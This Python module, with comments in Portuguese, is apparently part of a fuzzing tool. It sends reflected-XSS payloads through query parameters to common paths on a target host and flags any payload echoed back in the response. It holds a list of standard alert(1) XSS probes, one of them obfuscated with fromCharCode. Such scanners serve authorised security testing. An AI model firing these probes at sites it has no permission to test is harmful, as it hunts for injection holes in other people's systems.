# FuzzXss do ByP4ss
# Testa payloads XSS em query string, detecta reflexao no corpo.
# Chamado por FuzzEngine: Mod.Testar(Alvo, Iteracoes) -> dict
#
# Nao executa JS. So detecta se o payload volta no HTML (reflexao).

import time
import socket
import urllib.parse

from Core.Config import Config
from Core.Log import Log


class FuzzXss:

    PATHS = ["/", "/search.php", "/index.php", "/login.php", "/api", "/q"]
    PARAMS = ["q", "search", "query", "name", "msg", "redirect", "url"]

    PAYLOADS = [
        "<script>alert(1)</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "\"><script>alert(1)</script>",
        "'>alert(1)//",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "javascript:alert(1)",
        "<a href=\"javascript:alert(1)\">x</a>",
        "<math><mtext></mtext><script>alert(1)</script></math>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    ]

    MARCADORES_XSS = [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>", "javascript:alert(1)",
    ]

    TIMEOUT = 2.0

    @staticmethod
    def Testar(Alvo, Iteracoes):
        Resultado = {
            "ok": True, "tecnica": "xss",
            "iteracoes": int(Iteracoes or 100),
            "crashes": [], "anomalias": [],
            "duracao_s": 0.0,
        }
        if not Alvo:
            Resultado["ok"] = False
            Resultado["motivo"] = "alvo_ausente"
            return Resultado
        Inicio = time.monotonic()
        Porta = 80
        Count = 0
        for Path in FuzzXss.PATHS:
            for Payload in FuzzXss.PAYLOADS:
                if Count >= Resultado["iteracoes"]:
                    break
                Param = FuzzXss.PARAMS[Count % len(FuzzXss.PARAMS)]
                R = FuzzXss._TestarPayload(Alvo, Porta, Path, Param, Payload)
                Count += 1
                FuzzXss._Registrar(R, Payload, Path, Param, Resultado)
            if Count >= Resultado["iteracoes"]:
                break
        Resultado["iteracoes"] = Count
        Resultado["duracao_s"] = round(time.monotonic() - Inicio, 2)
        return Resultado

    @staticmethod
    def _TestarPayload(Alvo, Porta, Path, Param, Payload):
        Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Sock.settimeout(FuzzXss.TIMEOUT)
        try:
            if Sock.connect_ex((Alvo, Porta)) != 0:
                return {"ok": False, "motivo": "conexao_falhou"}
            ValorEnc = urllib.parse.quote(Payload, safe="")
            Sep = "&" if "?" in Path else "?"
            AlvoUrl = f"{Path}{Sep}{Param}={ValorEnc}"
            Req = (f"GET {AlvoUrl} HTTP/1.0\r\n"
                   f"Host: {Alvo}\r\nConnection: close\r\n\r\n")
            Sock.sendall(Req.encode("utf-8", errors="replace"))
            Dados = Sock.recv(8192)
            return {
                "ok": True,
                "status": FuzzXss._Status(Dados),
                "tamanho": len(Dados),
                "corpo": Dados[:4096].decode("utf-8", errors="replace"),
            }
        except socket.timeout:
            return {"ok": False, "motivo": "timeout"}
        except Exception as E:
            return {"ok": False, "motivo": type(E).__name__}
        finally:
            try: Sock.close()
            except Exception: pass

    @staticmethod
    def _Status(Dados):
        if not Dados:
            return 0
        try:
            P = Dados.split(b"\r\n", 1)[0].decode("utf-8", errors="replace").split()
            if len(P) >= 2:
                return int(P[1])
        except Exception:
            pass
        return 0

    @staticmethod
    def _Registrar(R, Payload, Path, Param, Resultado):
        if not R.get("ok"):
            if R.get("motivo") == "timeout":
                Resultado["anomalias"].append({
                    "tipo": "xss_timeout", "path": Path, "param": Param,
                    "payload": Payload[:40],
                })
            return
        Corpo = R.get("corpo") or ""
        Refletiu = any(M in Corpo for M in FuzzXss.MARCADORES_XSS)
        RefletiuPayload = Payload in Corpo
        if Refletiu or RefletiuPayload:
            Resultado["crashes"].append({
                "tipo": "xss_refletido", "path": Path, "param": Param,
                "payload": Payload[:60], "status": R.get("status"),
                "evidencia": Corpo[:200],
            })
        elif R.get("status", 0) >= 500:
            Resultado["anomalias"].append({
                "tipo": "xss_5xx", "path": Path, "param": Param,
                "payload": Payload[:40], "status": R.get("status"),
            })

    @staticmethod
    def Info():
        return {"nome": "FuzzXss", "payloads": len(FuzzXss.PAYLOADS),
                "paths": len(FuzzXss.PATHS)}
